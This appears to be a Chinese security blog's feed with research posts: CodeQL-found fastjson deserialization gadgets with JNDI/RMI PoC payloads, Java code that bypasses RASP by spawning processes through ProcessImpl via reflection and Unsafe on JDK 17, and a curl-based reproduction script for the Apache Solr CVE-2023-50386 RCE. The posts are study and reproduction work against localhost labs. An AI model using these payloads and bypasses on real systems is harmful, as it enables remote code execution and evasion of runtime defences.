result = <span class="hljs-built_in">seekSink</span>(method)<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>看着逻辑挺绕的，作者也没细讲。</p><ol><li><code>ma.getEnclosingStmt() = sourceMethod.getBody().getAChild*()</code>: 这部分条件要求 <code>ma</code> 对象所在的语句（enclosing statement）是给定方法 <code>sourceMethod</code> 的一个子语句。换句话说，<code>ma</code> 对象是在 <code>sourceMethod</code> 方法的主体中被访问的。</li><li>和1差不多，查找了匿名类的sink</li></ol><p><img src="/../codeqlWithFastjson/Image.png" alt="Image"></p><p><img src="/../codeqlWithFastjson/Image-1712547554508-2.png" alt="img"></p><p>有该成员变量。并且有setter。</p><p>sink:</p><p><img src="/../codeqlWithFastjson/Image(1).png" alt="img"></p><p>可以给出一个poc：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;\&quot;@<span class="hljs-built_in">type</span>\&quot;:\&quot;org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore\&quot;,\&quot;TransactionManagerJNDIName\&quot;:\&quot;rmi://127.0.0.1:1389/Exploit\&quot;, \&quot;transaction\&quot;:&#123;\&quot;<span class="hljs-variable">$ref</span>\&quot;:\&quot;$.transaction\&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p>原文章里打错了，他的poc里Transaction开头t应该小写。</p><p>另一个没有setUrl，但是观察过后也是可以利用的，我们挖掘fastjson往往关注getter和setter，而忽略了构造函数。</p><h1 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h1><p>fastjson parse的时候是会调用public的含参构造函数的，其实可以加一条：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FastjsonConstructorMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Constructor</span> </span>&#123;<br>    <span class="hljs-type">FastjsonConstructorMethod</span>() &#123;<br>        <span class="hljs-keyword">this</span>.isPublic()<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于Constructor和Method都是继承自Callable，那么改一下seekSink：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title class_">MethodAccess</span> <span class="hljs-title function_">seekSink</span>(<span class="hljs-params">Callable</span> <span class="hljs-params">sourceMethod</span>)&#123;<br></code></pre></td></tr></table></figure><p><img src="/../codeqlWithFastjson/image-20240408114340352.png" alt="image-20240408114340352"></p><p>可以看一下，JNDIConnectionProvider的构造函数会设置this.url, 然后进入init， init里有jndi查询：</p><p><img src="/../codeqlWithFastjson/image-20240408114638583.png" alt="image-20240408114638583"></p><p>诶这不就能打了，给个poc：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>@type<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>org.quartz.utils.JNDIConnectionProvider<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>jndiUrl<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>rmi://localhost:1389/Exploit<span class="hljs-subst">\&quot;</span>&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>另一个是写死的，没法利用。</p><p><img src="/../codeqlWithFastjson/image-20240408114748546.png" alt="image-20240408114748546"></p>]]></content>
    
    
    
    <tags>
      
      <tag>java security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/01/AliyunCTF-2024-chain17-%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/04/01/AliyunCTF-2024-chain17-%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/01/%E5%8E%9F%E7%94%9FJDK%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <url>/2024/04/01/%E5%8E%9F%E7%94%9FJDK%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/30/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AF%87%E4%B9%8Bclass%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    <url>/2024/03/30/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AF%87%E4%B9%8Bclass%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/17/fastjson1.2.80-RCE-groovy%E9%93%BE/"/>
    <url>/2024/03/17/fastjson1.2.80-RCE-groovy%E9%93%BE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RASP_and_java命令执行</title>
    <link href="/2024/03/13/RASP-and-java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/03/13/RASP-and-java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p>最近突然忙起来了，未来有点想做sdl建设，看了不少甲方sdl做的事（我寒假在boss看了好久的招聘要求，没想到p牛的星球最近直接有人总结了。。。）</p><p>DAST的话，想先写个漏扫练手，我的开发能力实在是一般。SAST，暂时先放着（太忙了）。RASP也在入门。</p><p>今年护网还提前了，去年没去过，今年想参加一下。匆忙准备ing。。。</p><p><a href="https://xz.aliyun.com/t/14048">https://xz.aliyun.com/t/14048</a></p><p>看到这篇文章，里面有些说法有问题，故探究了一下。</p><p>原文说win和linux都是forkAndExec，实际上win下的jdk是create函数。</p><p><img src="/../RASP_and_java_RCE/image-20240314190636212.png" alt="image-20240314190636212"></p><p>调用栈如下：</p><p><img src="/../RASP_and_java_RCE/Image.png" alt="Image"></p><p>UNIXProcess在win下是ProcessImpl。</p><p>Runtime和ProcessBuilder就不说了，这两个太常见了，往下到ProcessImpl，命令执行也很简单，反射拿一下就行：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        private ProcessImpl(String cmd[],</span><br><span class="hljs-comment">                        final String envblock,</span><br><span class="hljs-comment">                        final String path,</span><br><span class="hljs-comment">                        final long[] stdHandles,</span><br><span class="hljs-comment">                        final boolean redirectErrorStream)</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws Exception </span>&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.<span class="hljs-built_in">getDeclaredConstructor</span>(<span class="hljs-type">String</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">long</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-type">boolean</span>.<span class="hljs-keyword">class</span>);<br>        constructor.<span class="hljs-built_in">setAccessible</span>(<span class="hljs-literal">true</span>);<br>        Object processImpl = constructor.<span class="hljs-built_in">newInstance</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;, null, null, <span class="hljs-keyword">new</span> <span class="hljs-type">long</span>[]&#123;<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>&#125;, <span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>三个-1的数组是我debug来的：</p><p><img src="/../RASP_and_java_RCE/Image-1710414529761-2.png" alt="Image"></p><p>构造函数被禁了怎么办？原文给出的是Unsafe.allocate, 这个我记得在之前看yso源码的时候还有一个方法，是ReflectionFactory</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package org.example;<br><br><span class="hljs-keyword">import</span> sun.reflect.ReflectionFactory;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.<span class="hljs-keyword">Method</span>;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Main &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        private ProcessImpl(String cmd[],</span><br><span class="hljs-comment">                        final String envblock,</span><br><span class="hljs-comment">                        final String path,</span><br><span class="hljs-comment">                        final long[] stdHandles,</span><br><span class="hljs-comment">                        final boolean redirectErrorStream)</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-keyword">Class</span>&lt;?&gt; clazz = <span class="hljs-keyword">Class</span>.forName(&quot;java.lang.ProcessImpl&quot;);<br>        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();<br>        Constructor&lt;?&gt; constructor = reflectionFactory.newConstructorForSerialization(clazz, <span class="hljs-keyword">Object</span>.<span class="hljs-keyword">class</span>.getDeclaredConstructor());<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">Object</span> instance = constructor.newInstance();<br><br>        <span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span> = clazz.getDeclaredMethod(&quot;create&quot;, String.<span class="hljs-keyword">class</span>, String.<span class="hljs-keyword">class</span>, String.<span class="hljs-keyword">class</span>, long[].<span class="hljs-keyword">class</span>, <span class="hljs-type">boolean</span>.<span class="hljs-keyword">class</span>);<br>        <span class="hljs-keyword">method</span>.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">method</span>.invoke(instance, &quot;calc&quot;, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-built_in">new</span> long[]&#123;<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>&#125;, <span class="hljs-keyword">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在加上JDK 17的绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.reflect.ReflectionFactory;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        private ProcessImpl(String cmd[],</span><br><span class="hljs-comment">                        final String envblock,</span><br><span class="hljs-comment">                        final String path,</span><br><span class="hljs-comment">                        final long[] stdHandles,</span><br><span class="hljs-comment">                        final boolean redirectErrorStream)</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        <span class="hljs-type">ReflectionFactory</span> <span class="hljs-variable">reflectionFactory</span> <span class="hljs-operator">=</span> ReflectionFactory.getReflectionFactory();<br>        Constructor&lt;?&gt; constructor = reflectionFactory.newConstructorForSerialization(clazz, Object.class.getDeclaredConstructor());<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unSafeField</span> <span class="hljs-operator">=</span> sun.misc.Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unSafeClass</span> <span class="hljs-operator">=</span> (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> Main.class;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br><br>        unSafeClass.getAndSetObject(currentClass, addr, Object.class.getModule());<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="hljs-type">long</span>[].class, <span class="hljs-type">boolean</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        method.invoke(instance, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;, <span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用Unsafe + JDK17绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> Main.class;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(currentClass, addr, Object.class.getModule());<br><br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">createMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="hljs-type">long</span>[].class, <span class="hljs-type">boolean</span>.class);<br>        createMethod.setAccessible(<span class="hljs-literal">true</span>);<br><br>        createMethod.invoke(processObject, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;, <span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JNI</p><p>参考这篇文章： <a href="https://www.cnblogs.com/nice0e3/p/14067160.html">Java安全之JNI绕过RASP - nice_0e3 - 博客园 (cnblogs.com)</a></p><p>写的很清晰了，我就不写了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>java security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache-Solr-Backup/Restore-APIs-代码执行漏洞（CVE-2023-50386）</title>
    <link href="/2024/02/25/Apache-Solr-Backup-Restore-APIs-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-50386%EF%BC%89/"/>
    <url>/2024/02/25/Apache-Solr-Backup-Restore-APIs-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-50386%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>这个漏洞感觉也太牛了，狠狠地学习一下。<br>参考文章：<a href="https://l3yx.github.io/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/">Apache Solr Backup&#x2F;Restore APIs RCE (CVE-2023-50386)分析及挖掘思路 | l3yx’s blog</a></p><p>solr的概念，一大堆，就看了和这个洞相关的，见：<br><a href="https://paper.seebug.org/1515/#210">Apache Solr 组件安全概览 (seebug.org)</a></p><p>环境配置和操作步骤见原文，这里我把命令集合了一下，方便调试：<br>制作好conf1.zip和conf2.zip.<br><img src="/../CVE-2023-50386/C46731C3F4374CA98082B8AB377B3667.png" alt="img"></p><p>exploit.sh:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">curl &quot;http://127.0.0.1:8983/solr/admin/collections?action=<span class="hljs-keyword">DELETE</span>&amp;name=collection1<span class="hljs-string">&quot;</span><br><span class="hljs-string">curl &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/configs?action=<span class="hljs-keyword">DELETE</span>&amp;name=conf1<span class="hljs-string">&quot;</span><br><span class="hljs-string">curl &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/configs?action=<span class="hljs-keyword">DELETE</span>&amp;name=conf2<span class="hljs-string">&quot;</span><br><span class="hljs-string">curl &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/collections?action=<span class="hljs-keyword">DELETE</span>&amp;name=collection2<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">curl -X POST --header &quot;</span>Content-<span class="hljs-built_in">Type</span>:application/octet-stream<span class="hljs-string">&quot; --data-binary @conf1.zip &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/configs?action=UPLOAD&amp;name=conf1<span class="hljs-string">&quot;</span><br><span class="hljs-string">curl &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/collections?action=<span class="hljs-keyword">CREATE</span>&amp;name=collection1&amp;numShards=<span class="hljs-number">1</span>&amp;replicationFactor=<span class="hljs-number">1</span>&amp;wt=json&amp;<span class="hljs-keyword">collection</span>.configName=conf1<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">curl &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/collections?action=BACKUP&amp;<span class="hljs-keyword">collection</span>=collection1&amp;location=/var/solr/data/&amp;name=collection2_shard1_replica_n1<span class="hljs-string">&quot;</span><br><span class="hljs-string">curl &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/collections?action=BACKUP&amp;<span class="hljs-keyword">collection</span>=collection1&amp;location=/var/solr/data/collection2_shard1_replica_n1&amp;name=lib<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">curl -X POST --header &quot;</span>Content-<span class="hljs-built_in">Type</span>:application/octet-stream<span class="hljs-string">&quot; --data-binary @conf2.zip &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/configs?action=UPLOAD&amp;name=conf2<span class="hljs-string">&quot;</span><br><span class="hljs-string">curl &quot;</span>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8983</span>/solr/admin/collections?action=<span class="hljs-keyword">CREATE</span>&amp;name=collection2&amp;numShards=<span class="hljs-number">1</span>&amp;replicationFactor=<span class="hljs-number">1</span>&amp;wt=json&amp;<span class="hljs-keyword">collection</span>.configName=conf2<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>漏洞成因就是各种未授权接口，默认情况下，UPLOAD，BACKUP，和CREATE这三个结合造成了漏洞。</p><p>关于接口可以参考官方文档：</p><p><a href="https://solr.apache.org/guide/solr/9_0/configuration-guide/configsets-api.html">Configsets API :: Apache Solr Reference Guide</a></p><p><a href="https://solr.apache.org/guide/solr/9_0/deployment-guide/collection-management.html#backup">Collection Management Commands :: Apache Solr Reference Guide</a></p><h1 id="1：调试UPLOAD-CREATE"><a href="#1：调试UPLOAD-CREATE" class="headerlink" title="1：调试UPLOAD + CREATE"></a>1：调试UPLOAD + CREATE</h1><p>org.apache.solr.handler.admin.CollectionsHandler#handleRequestBody打断点。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">curl &quot;http://127.0.0.1:8983/solr/admin/collections?action=<span class="hljs-keyword">CREATE</span>&amp;name=test_collection&amp;numShards=<span class="hljs-number">1</span>&amp;replicationFactor=<span class="hljs-number">1</span>&amp;wt=json&amp;<span class="hljs-keyword">collection</span>.con figName=_default<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>到org.apache.solr.core.SolrConfig#initLibs<br><img src="/../CVE-2023-50386/38629C5AEB3D4B98B5CCA6E4ED605426.png" alt="img"><br>这里会检查目录下是否有lib。如果有就会把东西add进urls。<br>我们传递的是test_collection, 那么创建的文件在&#x2F;var&#x2F;solr&#x2F;data&#x2F;test_collection_shard1_replica_n1</p><p>先把它删了：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">curl &quot;http://127.0.0.1:8983/solr/admin/collections?action=<span class="hljs-keyword">DELETE</span>&amp;name=test_collection&amp;numShards=<span class="hljs-number">1</span>&amp;replicationFactor=<span class="hljs-number">1</span>&amp;wt=json&amp;<span class="hljs-keyword">collection</span>.con figName=_default<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>然后手动创建一下，看看啥情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> test_collection_shard1_replica_n1<br><span class="hljs-built_in">mkdir</span> test_collection_shard1_replica_n1/lib<br><span class="hljs-built_in">cd</span> test_collection_shard1_replica_n1/lib<br><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span>/test123<br><span class="hljs-built_in">touch</span> empty.jar<br></code></pre></td></tr></table></figure><p><img src="/../CVE-2023-50386/E64B664F6EA248FD869B5A72CE188B96.png" alt="img"><br>如图，看看url最后去哪了。</p><p><img src="/../CVE-2023-50386/1C83A9330E9948EA9F185DC003D9A5A0.png" alt="img"></p><p><img src="/../CVE-2023-50386/41338060CC6B45D1BFE8A23F89B0DBB1.png" alt="img"><br>可以看到是加进ClassLoader里了。<br>那么可以有个思路了，假如我们可以在lib里放jar包或者class文件，用URLClassLoader远程加载，然后命令执行。</p><h1 id="2-BACKUP"><a href="#2-BACKUP" class="headerlink" title="2: BACKUP"></a>2: BACKUP</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://127.0.0.1:8983/solr/admin/collections?action=BACKUP&amp;collection=collection1&amp;location=/var/solr/data/&amp;name=collection2_shard1_replica_n1&quot;</span><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://127.0.0.1:8983/solr/admin/collections?action=BACKUP&amp;collection=collection1&amp;location=/var/solr/data/collection2_shard1_replica_n1&amp;name=lib&quot;</span><br></code></pre></td></tr></table></figure><p>location和name参数。而且要求是location这个目录必须提前存在（所以这里要curl两次）<br>这样collection2_shard1_replica_n1&#x2F;lib目录就会创建了：<br><img src="/../CVE-2023-50386/34B225F48D81415DA54FBE3F61B4F9BF.png" alt="img"><br>然后我们再CREATE即可：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">curl &quot;http://127.0.0.1:8983/solr/admin/collections?action=<span class="hljs-keyword">CREATE</span>&amp;name=collection2&amp;numShards=<span class="hljs-number">1</span>&amp;replicationFactor=<span class="hljs-number">1</span>&amp;wt=json&amp;<span class="hljs-keyword">collection</span>.configName=conf2<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../CVE-2023-50386/FDF66654D36647B3942445FF713A9AD6.png" 